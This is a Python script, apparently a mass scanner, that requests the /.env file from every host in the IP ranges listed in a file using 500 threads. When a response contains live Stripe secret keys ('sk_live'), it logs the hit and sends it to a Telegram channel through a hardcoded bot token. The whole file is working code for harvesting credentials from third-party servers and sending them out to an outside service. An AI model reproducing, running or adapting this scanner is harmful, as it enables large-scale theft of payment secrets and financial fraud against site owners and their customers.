import requests
from requests.exceptions import Timeout
import ipaddress
import concurrent.futures
import telebot

# Replace 'YOUR_BOT_TOKEN' with your actual bot token
bot = telebot.TeleBot('1915896583:AAErqDx6EsDZS5aASNq8eKNicHT5c-7COmA')
telegram_channel = '@ilham_maulana1'  # Replace with your actual channel username

def send_telegram_message(message):
    bot.send_message(telegram_channel, message)

def check_ip(ip):
    url = f"http://{ip}/.env"
    headers = {
        'Host': ip,
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'DNT': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    try:
        response = requests.get(url, headers=headers, timeout=4)
        if "sk_live" in response.text:
            print(f"IP: {ip}, Response: Found sk_live")
            message = f"IP: http://{ip}/.env, Response: Found sk_live"
            with open('vision.txt', 'a') as file:
                file.write(f"{message}\n")
            send_telegram_message(message)
        else:
            print(f"IP: {ip}, Response: {response.status_code}")
    except Timeout:
        print(f"IP: {ip}, Timeout Error")
    except requests.RequestException as e:
        print(f"IP: {ip}, Error: {e}")

def check_cidr(cidr_str):
    cidr_range = ipaddress.IPv4Network(cidr_str)
    ip_addresses = [str(ip) for ip in cidr_range.hosts()]

    with concurrent.futures.ThreadPoolExecutor(max_workers=500) as executor:
        executor.map(check_ip, ip_addresses)

def check_cidrs_from_file(file_path):
    with open(file_path, 'r') as file:
        for line in file:
            cidr_str = line.strip()
            check_cidr(cidr_str)

# Mengecek alamat IP untuk setiap CIDR dalam daftar dari file "cidr.txt"
check_cidrs_from_file('cidr.txt')
